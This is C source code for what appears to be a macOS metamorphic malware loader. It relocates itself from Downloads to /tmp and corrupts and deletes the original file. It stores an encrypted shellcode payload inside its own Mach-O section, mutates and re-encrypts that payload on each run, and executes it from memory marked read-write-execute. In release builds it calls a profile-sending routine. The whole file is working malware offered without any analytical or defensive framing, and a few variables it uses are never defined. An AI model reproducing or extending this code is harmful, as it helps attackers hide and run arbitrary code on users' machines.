#include <wisp.h>

uint64_t findSectionOffset(struct mach_header_64 *header, const char *sectName, const char *segName, size_t requiredSize) {
    struct load_command *lc = (struct load_command*)((char*)header + sizeof(*header));
    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64*)lc;
            struct section_64 *sec = (struct section_64*)((char*)seg + sizeof(*seg));
            for (uint32_t j = 0; j < seg->nsects; j++) {
                if (!strcmp(sec[j].sectname, sectName) && !strcmp(sec[j].segname, segName)) {
                    if (requiredSize > sec[j].size) return 0;
                    return sec[j].offset;
                }
            }
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    return 0;
}

int writeDataAtOffset(int fd, uint64_t offset, const uint8_t *data, size_t size) {
    if (lseek(fd, offset, SEEK_SET) == -1) { perror("lseek"); return -1; }
    size_t total = 0;
    while (total < size) {
        ssize_t w = write(fd, data + total, size - total);
        if (w <= 0) { perror("write"); return -1; }
        total += w;
    }
    return total == size ? 0 : -1;
}

void save_section(uint8_t *data, size_t sz) {
    char path[1024] = {0};
    uint32_t pathSize = sizeof(path);
    if (find_self(path, &pathSize) != 0) return;

    int fd = oprw(path);
    if (fd < 0) return;

    struct mach_header_64 *hdr = &_mh_execute_header;
    size_t actual_size = sz < (sizeof(enc_header_t) + PAGE_SIZE) ? sz : (sizeof(enc_header_t) + PAGE_SIZE);
    uint64_t sectionOffset = findSectionOffset(hdr, "__fdata", "__DATA", actual_size);
    if (!sectionOffset) { close(fd); return; }

    if (writeDataAtOffset(fd, sectionOffset, data, actual_size) != 0) { close(fd); return; }
    close(fd);
}

static void maybe_relocate_self(void) {
#ifndef TEST
    char exe[1024] = {0};
    uint32_t len = sizeof(exe);
    if (find_self(exe, &len)) exit(1);

    if (!strstr(exe, "/tmp/") && strstr(exe, "/Downloads/")) {
        char *base = strrchr(exe, '/'); base = base ? base + 1 : exe;
        char tmp[1024]; snprintf(tmp, sizeof(tmp), "/tmp/%s", base);

        FILE *src = fopen(exe, "rb"), *dst = fopen(tmp, "wb");
        if (!src || !dst) { if (src) fclose(src); if (dst) fclose(dst); exit(1); }

        char buf[4096]; size_t n;
        while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
            if (fwrite(buf, 1, n, dst) != n) { fclose(src); fclose(dst); exit(1); }

        fclose(src); fclose(dst);
        chmod(tmp, 0755);

        int fd = open(exe, O_RDWR);
        if (fd >= 0) { corrupt_macho(fd); close(fd); _self(exe); }

        char *argv[] = { tmp, NULL };
        execv(tmp, argv);
        exit(1);
    } else if (!strstr(exe, "/tmp/")) {
        fprintf(stderr, "%s\nDie...\n", exe);
        panic();
    }
#endif
}

void pop_shellcode(uint8_t *code, size_t size) {
    long ps = sysconf(_SC_PAGESIZE);
    if (ps <= 0) { perror("sysconf"); return; }

    uintptr_t start = (uintptr_t)code & ~(ps - 1);
    size_t tot = ((uintptr_t)code + size - start + ps - 1) & ~(ps - 1);

    if (mprotect((void*)start, tot, PROT_READ|PROT_WRITE|PROT_EXEC) != 0) { 
        perror("mprotect RWX"); panic(); return; 
    }

#if defined(__arm__) || defined(__aarch64__)
    __builtin___clear_cache((char*)code, (char*)code + size);
#endif
    ((void(*)(void))code)();
}

int boot(uint8_t *dsec, size_t ds, chacha_state_t *rng) {
    enc_header_t *hdr = (enc_header_t*)dsec;
    uint8_t *payload = dsec + sizeof(enc_header_t);
    engine_context_t ctx = {0};  // Initialize context

    if (hdr->count == 0) {
        uint8_t init_buffer[PAGE_SIZE];
        memset(init_buffer, 0x90, sizeof(init_buffer));
        if (len > sizeof(init_buffer)) return -1;
        memcpy(init_buffer, dummy, len);

        size_t entry_protect = 150;
        if (len > entry_protect)
            mut_sh3ll(init_buffer + entry_protect, len - entry_protect, rng, hdr->count, &ctx);

        if (getentropy(hdr->key, KEY_SIZE) != 0 || getentropy(hdr->iv, kCCBlockSizeAES128) != 0) panic();

        cipher(hdr->key, hdr->iv, init_buffer, payload, PAGE_SIZE);
        CC_SHA256(payload, PAGE_SIZE, hdr->hash);
        save_section(dsec, ds);
        hdr->count = 1;
    }
    return 0;
}

int cook(uint8_t *dsec, size_t ds, chacha_state_t *rng) {
    enc_header_t *hdr = (enc_header_t*)dsec;
    uint8_t *payload = dsec + sizeof(enc_header_t);
    uint8_t *dec = malloc(PAGE_SIZE);
    if (!dec) return -1;

    decipher(hdr->key, hdr->iv, payload, dec, PAGE_SIZE);

    uint8_t comp[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(payload, PAGE_SIZE, comp);
    if (memcmp(hdr->hash, comp, CC_SHA256_DIGEST_LENGTH) != 0) panic();

    uint8_t *shellcode_buffer = malloc(len);
    if (!shellcode_buffer) { free(dec); return -1; }

    memcpy(shellcode_buffer, dec, len);
    engine_context_t ctx = {0};  // Initialize context
    mut_sh3ll(shellcode_buffer, len, rng, hdr->count, &ctx);
    memcpy(dec, shellcode_buffer, len);
    free(shellcode_buffer);

    if (getentropy(hdr->key, KEY_SIZE) != 0 || getentropy(hdr->iv, kCCBlockSizeAES128) != 0) {
        zer0(dec, PAGE_SIZE); free(dec); return -1;
    }

    cipher(hdr->key, hdr->iv, dec, payload, PAGE_SIZE);
    CC_SHA256(payload, PAGE_SIZE, hdr->hash);
    save_section(dsec, ds);

#ifdef RELEASE
    sendProfile();
#else
    void *code_ptr;
    if (posix_memalign(&code_ptr, PAGE_SIZE, PAGE_SIZE) != 0) { panic(); free(dec); return -1; }
    if (mprotect(code_ptr, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC) != 0) panic();
    O2(code_ptr, dec, PAGE_SIZE);
    if (mprotect(code_ptr, PAGE_SIZE, PROT_READ|PROT_EXEC) != 0) panic();
    pop_shellcode(code_ptr, len);
    free(code_ptr);
#endif

    zer0(dec, PAGE_SIZE); free(dec);
    hdr->seed = chacha20_random(rng);
    hdr->count++;
    return 0;
}

void initialize(void) {
    
    maybe_relocate_self();
    
    chacha_state_t rng;
    uint8_t seed[32];
    getentropy(seed, sizeof(seed));
    chacha20_init(&rng, seed, sizeof(seed));
    usleep((chacha20_random(&rng) & 0xFF) * 1000);

    unsigned long ds = 0;
    uint8_t *dsec = getsectiondata(&_mh_execute_header, "__DATA", "__fdata", &ds);
    if (!dsec || ds < sizeof(data)) exit(1);

    if (boot(dsec, ds, &rng) != 0 || cook(dsec, ds, &rng) != 0) exit(1);
}
